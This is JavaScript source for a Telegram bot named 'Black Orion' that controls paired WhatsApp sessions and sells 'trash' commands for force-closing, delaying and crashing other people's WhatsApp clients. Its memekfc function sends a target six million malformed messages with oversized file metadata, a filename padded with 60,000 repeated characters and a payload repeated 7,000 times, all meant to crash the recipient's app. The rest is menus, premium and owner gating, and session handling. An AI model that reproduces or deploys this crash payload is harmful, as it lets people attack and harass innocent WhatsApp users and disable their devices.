const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const { exec } = require("child_process");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require('moment');
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "5053359392", "5053359392"]; 
const kontolmedia = fs.readFileSync('./lib/thumb.jpeg')


const GROUP_ID_FILE = 'group_ids.json';//untuk menyimpan yang hanya di izinkan atau tidak di group kamu seperti /addgroup /delgroup

// Fungsi untuk memeriksa apakah bot diizinkan untuk beroperasi di grup tertentu
function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}

// file db
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/anything-101/scrapefile/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens; // ambil dari object 'tokens'
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("𝗠𝗔𝗔𝗙!\n𝗧𝗢𝗞𝗘𝗡 𝗔𝗡𝗗𝗔 𝗧𝗜𝗗𝗔𝗞 𝗗𝗜𝗞𝗘𝗡𝗔𝗟𝗜:", error.message));
    return [];
  }
}

// Validasi token
async function validateToken() {
  console.log(chalk.red("⏳ Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ 𝗠𝗔𝗔𝗙 𝗧𝗢𝗞𝗘𝗡 𝗔𝗡𝗗𝗔 𝗧𝗜𝗗𝗔𝗞 𝗞𝗘𝗡𝗔𝗟𝗜,𝗣𝗔𝗡𝗘𝗟 𝗔𝗞𝗔𝗡 𝗕𝗘𝗥𝗛𝗘𝗡𝗧𝗜 𝗦𝗘𝗖𝗔𝗥𝗔 𝗢𝗧𝗢𝗠𝗔𝗧𝗜𝗦"));
    process.exit(1);
  }

  console.log(chalk.green("✅ 𝘒𝘓𝘡 𝘛𝘖𝘒𝘌𝘕 𝘔𝘜 𝘋𝘐𝘒𝘌𝘕𝘈𝘓 𝘉𝘙𝘖𝘖!!!"));
  startBot();
}

// Fungsi startBot kalau token valid
function startBot() {
  console.log(chalk.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢛⡛⠿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠟⡉⣡⡖⠘⢗⣀⣀⡀⢢⣐⣤⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠉⣠⣲⣾⡭⣀⢟⣩⣶⣶⡦⠈⣿⣿⣿⣷⣖⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡛⢀⠚⢩⠍⠀⠀⠡⠾⠿⣋⡥⠀⣤⠈⢷⠹⣿⣎⢳⣶⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⡤⠉⠀⠀⠀⣴⠆⠠⠾⠋⠁⣼⡿⢰⣸⣇⢿⣿⡎⣿⡷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠀⢸⢧⠁⠀⠀⢸⠇⢐⣂⣠⡴⠶⣮⢡⣿⢃⡟⡘⣿⣿⢸⣷⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣯⢀⡏⡾⢠⣿⣶⠏⣦⢀⠈⠉⡙⢻⡏⣾⡏⣼⠇⢳⣿⡇⣼⡿⡁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠈⡇⡇⡘⢏⡃⠀⢿⣶⣾⣷⣿⣿⣿⡘⡸⠇⠌⣾⢏⡼⣿⠇⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⠀⢇⠃⢢⡙⣜⣾⣿⣿⣿⣿⣿⣿⣧⣦⣄⡚⣡⡾⣣⠏⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⡀⡀⠃⠸⣧⠘⢿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⠃⠘⠁⢈⣤⡀⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣅⠀⠀⠸⠀⣦⡙⢿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⢛⣉⣉⣀⡀⠀⢸⣿⣿⣷⣬⣛⠛⢛⣩⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⢋⣴⣿⣿⣿⣿⣿⣦⣬⣛⣻⠿⢿⣿⡇⠈⠙⢛⣛⣩⣭⣭⣝⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡇⣼⣿⣿⣿⣿⣿⡿⡹⢿⣿⣽⣭⣭⣭⣄⣙⠻⢿⣿⡿⣝⣛⣛⡻⢆⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢥⣿⣿⣿⣿⣿⣿⢇⣴⣿⣿⣿⣿⣿⡿⣿⣿⣿⣷⣌⢻⣿⣿⣿⣿⣿⣷⣶⣌⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿
⡆⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣿⣿⣿⣄⣸⣿⣿⣿⣿⣦⢻⣿⣿⣿⣿⣿⣿⣿⠁⠊⠻⣿⣿⣿⣿⣿⣿⣿
⣿⠸⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣷⣿⠀⣿⣿⣿⣿⣿⣿⣿
⣿⣄⢻⣿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠈⣿⣿⣿⣿⣷⢙⠿⣿⣿⣿⣿⣿⣿⣿⠿⣟⣩⣴⣷⣌⠻⣿⣿⣿⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣆⢻⣿⣿⣿⣿⡇⣷⣶⣭⣭⣭⣵⣶⣾⣿⣿⣿⣿⣿⣿⣷⣌⠹⢿⣿⡿⢋⣠⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡚⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⢻⣿⣿⣿⡇⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⠈⣿⣿⣿⣿⢆⠀⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣥⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⣻⣿⣿⣿⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣒⣻⣿⣿⢏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⢹⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣷⣬⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⠻⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⢎⢻⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣾⣦⢻⣿⣿
⣿⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣆⢻⣿
⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⣿⣆⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⣿⣿⣿⣿⣿⡎
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⡆⢿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⢸⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢹⠸⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡌⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢰⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
Name    : 𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻
Version : 0.0
`));
}

validateToken();

// Fungsi untuk menambahkan grup ke daftar yang diizinkan
function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}


// Fungsi untuk menghapus grup dari daftar yang diizinkan
function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}

// Fungsi untuk mengatur daftar ID grup yang diizinkan
function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}

// Fungsi untuk memeriksa apakah hanya grup yang diizinkan
function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; // Mengembalikan false jika tidak ada konfigurasi
}

// Fungsi untuk mengatur status hanya grup
function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

// Fungsi untuk menentukan apakah pesan harus diabaikan
function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}


const groupSettingsPath = './database/group-settings.json';
// Load atau inisialisasi pengaturan grup
let groupSettings = {};
if (fs.existsSync(groupSettingsPath)) {
  groupSettings = JSON.parse(fs.readFileSync(groupSettingsPath));
}

// Simpan pengaturan grup ke file
const saveGroupSettings = () => {
  fs.writeFileSync(groupSettingsPath, JSON.stringify(groupSettings, null, 2));
};

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ʙᴀɴɢ... ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`ɴɪʜ ʟᴀɢɪ ᴏᴛᴡ ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`sᴀʙᴀʀ ʙᴀɴɢ, ᴋᴏᴋ ᴇʀᴏʀ?? ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`ɴᴀʜ ᴛᴜʜ ᴜᴅᴀʜ ʙɪsᴀ ʙᴀɴɢ ${botNumber}.....sᴇʟᴀᴍᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ\`\`\`
ᴛᴜʜ ᴄᴏᴅᴇ ʟᴜ ᴘᴀsᴀɴɢ ɢᴇᴄᴇʜ: ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴏʙʟᴏᴄᴋ, ᴋᴏᴋ ɢᴀɢᴀʟ sɪ? ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/kddj06.jpg" // ini gak di gunain si
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "✅";
  } else {
    return "❌";
  }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "⚡";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "⚡";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf Anda Bukan Owner");
    }
};

//====================DI BAWAH SINI ISI FUNCTION ELU==============================\\
async function memekfc(sock, target) {
    const repeat = 6000000; 
    
    for(let i = 0; i < repeat; i++) {
        const msg = generateWAMessageFromContent(target, {
            ephemeralMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "999999999999",
                        pageCount: 1316134911,
                        height: 999999999,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "nj" + "ꦾ".repeat(60000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703"
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: ".",
                                matchedText: "https://t.me/",
                                description: "!.",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { messageId: null, participant: { jid: target } });
    }
}
// END FUNCTION SELESAI
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);  // Mengambil status premium langsung
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

  // Tidak lagi memeriksa status premium, langsung ke video
  bot.sendPhoto(chatId, "https://files.catbox.moe/01x5r0.jpg", {
    caption: `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱ BOT ☇ INFORMATION ───═⬡</blockquote>
 𖥂 Author : @RidzzOffc
 𖥂 BotName : 𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻
 𖥂 Version : 0.0
 𖥂 Status : Private
<blockquote>╭═───⊱ YOUR ☇ INFORMATION ───═⬡</blockquote>
 𖥂 Name : ${username}
 𖥂 ID : ${senderId}
 𖥂 Premium : ${premiumStatus}
 𖥂 Aktif : ${runtime}

`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Trash Menu", callback_data: "trashmenu" }
        ],
        [
          { text: "Owner Menu", callback_data: "setting" },
          { text: "TqTo", callback_data: "tqto" },
          { text: "Group Menu", callback_data: "group" }
        ],
        [
          { text: "Channel", url: "https://t.me/ghostStrm" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱ YOUR ☇ INFORMATION ───═⬡</blockquote>
 𖥂 Name : ${username}
 𖥂 ID : ${senderId}
 𖥂 Premium : ${premiumStatus}
 𖥂 Aktip : ${runtime}

<blockquote>╭═───⊱ TRASH MENU ───═⬡</blockquote>
𖥂 /Force
    ╰➤ Forclose Invisible Spam
𖥂 /Delay
    ╰➤ Delay Invisible Spam
𖥂 /victrus
    ╰➤ Forclose Infinity No Click
𖥂 /spirtus
    ╰➤ Forclose No Click Crash 
𖥂 /avail
    ╰➤ Crash UI
<blockquote>CLICK BUTTON DIBAWAH</blockquote>
`;
// DI ATAS ISI LIST MENU ELU
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
    
    if (query.data === "setting") {
      caption = `
<blockquote>𝗕𝗹𝗮𝗰𝗸 ☇ 𝗢𝗿𝗶𝗼𝗻</blockquote>
( 🫀 ) OLAA — ${username} さん、お元気ですか？私は Telegram のボットです。賢く使ってください。無実の人に誤って使わないでください。私のチャンネルで更新情報をお待ちください
<blockquote>╭═───⊱ YOUR ☇ INFORMATION ───═⬡</blockquote>
